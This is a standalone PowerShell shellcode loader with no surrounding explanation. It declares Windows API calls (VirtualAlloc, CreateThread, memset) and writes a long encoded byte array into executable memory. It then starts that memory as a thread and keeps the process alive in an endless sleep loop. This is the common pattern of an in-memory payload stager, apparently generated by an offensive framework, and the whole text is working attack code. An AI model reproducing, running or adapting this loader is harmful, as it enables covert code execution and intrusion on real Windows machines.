$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xf3,0x8e,0x31,0x19,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x7b,0x0f,0x03,0x7b,0xfc,0x6c,0xc4,0xe5,0xea,0xf3,0x27,0x16,0xea,0x93,0xae,0xf3,0xdb,0x93,0xd5,0x70,0x4b,0x24,0x9d,0xd5,0x67,0xcf,0xf3,0xcd,0xfc,0xbd,0xdb,0xe2,0xb5,0x08,0x3a,0xcc,0x46,0x20,0x7e,0x4f,0xc4,0x3b,0x53,0xaf,0xf5,0xf3,0xa6,0xae,0x32,0xe9,0x4b,0xe2,0xeb,0x65,0xf9,0x13,0x98,0x30,0xc2,0x98,0xd2,0xd5,0x42,0x7c,0xa2,0xd4,0x63,0xd3,0xb9,0x8e,0xa3,0xd5,0x6e,0xbb,0xed,0xcd,0x73,0x86,0xa4,0x66,0x47,0x7c,0x37,0xaf,0x96,0x7d,0x94,0x8e,0x17,0x8c,0xe4,0xd7,0x9f,0x6f,0x93,0x21,0xdc,0x12,0xa4,0xf5,0x9f,0xc8,0x21,0xee,0x07,0x9a,0x92,0xca,0xb6,0x4f,0x44,0x98,0xb4,0x24,0x02,0xc6,0xd8,0xbb,0xc7,0x7c,0xe4,0x30,0xe6,0x52,0x6d,0x02,0xcd,0x76,0x36,0xd0,0x6c,0x2e,0x92,0xb7,0x91,0x30,0x7d,0x67,0x34,0x3a,0x93,0x7c,0x45,0x61,0xfb,0xb1,0x64,0x9a,0xfb,0xdd,0xff,0xe9,0xc9,0x42,0x54,0x66,0x61,0x0a,0x72,0x71,0x86,0x21,0xc2,0xed,0x79,0xca,0x33,0x27,0xbd,0x9e,0x63,0x5f,0x14,0x9f,0xef,0x9f,0x99,0x4a,0xbf,0xcf,0x35,0x25,0x00,0xa0,0xf5,0x95,0xe8,0xaa,0xfa,0xca,0x09,0xd5,0xd1,0x62,0xa3,0x2f,0xb1,0x4c,0x9c,0x31,0x09,0x25,0xdf,0x31,0x88,0x0e,0x56,0xd7,0xe0,0x60,0x3f,0x4f,0x9c,0x19,0x1a,0x1b,0x3d,0xe5,0xb0,0x61,0x7d,0x6d,0x37,0x95,0x33,0x86,0x32,0x85,0xa3,0x66,0x09,0xf7,0x65,0x78,0xa7,0x92,0x89,0xec,0x4c,0x35,0xde,0x98,0x4e,0x60,0x28,0x07,0xb0,0x47,0x23,0x8e,0x24,0x28,0x5b,0xef,0xa8,0xa8,0x9b,0xb9,0xa2,0xa8,0xf3,0x1d,0x97,0xfa,0xe6,0x61,0x02,0x6f,0xbb,0xf7,0xad,0xc6,0x68,0x5f,0xc6,0xe4,0x57,0x97,0x49,0x16,0xb2,0x29,0xb5,0xc1,0xfa,0x5f,0xd7,0xd1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
